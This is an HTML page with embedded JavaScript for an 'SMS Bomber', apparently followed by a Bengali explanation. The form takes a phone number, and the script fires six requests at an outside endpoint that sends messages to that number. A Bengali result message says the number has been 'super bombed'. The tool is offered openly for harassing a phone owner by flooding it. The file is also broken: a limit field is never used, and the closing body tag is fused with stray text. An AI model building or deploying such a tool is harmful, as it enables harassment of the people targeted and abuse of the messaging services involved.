<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Bomber</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #ffffff;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
        }

        h1 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        label {
            font-size: 1.2em;
            color: #555;
        }

        input[type="number"] {
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
        }

        button {
            padding: 15px;
            background-color: #5cb85c;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #4cae4c;
        }

        #results {
            margin-top: 20px;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 4px;
        }

        .response {
            margin-bottom: 10px;
            padding: 10px;
            background: #d9edf7;
            border: 1px solid #bce8f1;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SMS Bomber</h1>
        <form id="apiForm">
            <label for="numberInput">Number:</label>
            <input type="number" id="numberInput" name="numberInput" required>

            <label for="limitInput">API Request Limit:</label>
            <input type="number" id="limitInput" name="limitInput" value="6" required>

            <button type="button" onclick="makeApiRequests()">Submit</button>
        </form>
        <div id="results"></div>
    </div>

    <script>
        function makeApiRequests() {
            const numberInput = document.getElementById('numberInput').value;
            const limitInput = document.getElementById('limitInput').value;
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';
            let completedRequests = 0;

            for (let i = 0; i < 6; i++) {
                fetch(`https://mohammadahad.com/ahad/main.php?num=${numberInput}`)
                    .then(response => response.text())
                    .then(data => {
                        const p = document.createElement('p');
                        p.className = 'response';
                        p.textContent = `API Response ${i + 1}: ${data} (এই নাম্বারে (০১৭+++++++) সুপার বোম্বি করা হয়েছে)`;
                        resultsDiv.appendChild(p);
                        completedRequests++;

                        if (completedRequests === 6) {
                            const countP = document.createElement('p');
                            countP.textContent = `Total API Requests: ${completedRequests}`;
                            resultsDiv.appendChild(countP);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
            }
        }
    </script>
</bodyখন এই কোডটি একই সাথে ৬ বার API রিকুয়েস্ট করবে এবং ইনপুট করা নম্বর সহ রেসপন্স প্রদর্শন করবে। এছাড়াও, আপনি API রিকুয়েস্ট লিমিট ইনপুট বাক্সের মাধ্যমে রিকুয়েস্ট সংখ্যা নির্ধারণ করতে পারবেন।
